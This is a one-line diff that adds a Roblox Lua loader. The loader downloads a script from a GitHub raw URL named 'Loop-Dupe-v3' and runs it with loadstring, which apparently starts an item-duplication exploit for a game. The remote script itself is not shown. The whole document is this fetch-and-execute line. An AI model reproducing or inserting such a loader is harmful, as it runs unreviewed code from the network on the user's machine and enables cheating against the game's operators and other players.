@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Driftsnorev2/Loop-Dupe-v3/main/Script1.txt'))()
